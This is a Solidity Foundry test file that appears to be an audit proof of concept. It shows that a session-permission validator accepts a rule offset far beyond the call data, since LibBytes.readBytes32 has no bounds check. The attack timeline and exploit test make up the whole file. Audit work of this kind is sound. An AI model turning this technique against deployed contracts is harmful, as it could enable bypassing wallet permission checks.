// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/extensions/sessions/explicit/Permission.sol";
import "../src/extensions/sessions/explicit/PermissionValidator.sol";
import "../src/modules/Payload.sol";
import "../src/utils/LibBytes.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy contracts, fund accounts via ExtendedSessionTestBase
// 2. [T=0] Attacker crafts a Permission with a Rule that has a large offset (e.g., 1000)
// 3. [T=1] Attacker crafts a Payload.Call with short data (e.g., 4 bytes)
// 4. [T=2] Attacker calls validatePermission() which uses LibBytes.readBytes32 without bounds checking
// 5. [Assert] Verify the out-of-bounds read succeeds and returns dirty memory/calldata values instead of reverting

contract AuditAgentPoC is ExtendedSessionTestBase {
    PermissionValidator public validator;

    function setUp() public virtual override {
        super.setUp();
        validator = new PermissionValidator();
    }

    function test_exploit() public {
        // Step 1: Create a permission with a rule that has a large offset
        Permission memory perm;
        perm.rules = new Permission.Rule[](1);
        perm.rules[0].offset = 1000; // Large offset beyond call data bounds
        perm.rules[0].mask = bytes32(type(uint256).max);
        perm.rules[0].value = bytes32(0);

        // Step 2: Create a call with short data
        Payload.Call memory call;
        call.to = address(mockTarget);
        call.data = hex"12345678"; // Only 4 bytes, much less than offset + 32

        // Step 3: Call validatePermission
        // LibBytes.readBytes32 does not bounds check, so it reads dirty memory/calldata
        // instead of reverting with an out-of-bounds error
        UsageLimit[] memory limits = new UsageLimit[](0);

        bool success;
        try validator.validatePermission(perm, call, address(this), address(this), limits) returns (bool result, UsageLimit[] memory) {
            success = true;
            // The function should have reverted due to out-of-bounds read, but it didn't
        } catch {
            success = false;
        }

        // Step 4: Assert that the out-of-bounds read did NOT revert
        // This proves the vulnerability: LibBytes allows reading beyond data boundaries
        assertTrue(success, "validatePermission should not revert on out-of-bounds read due to missing bounds check");
    }
}
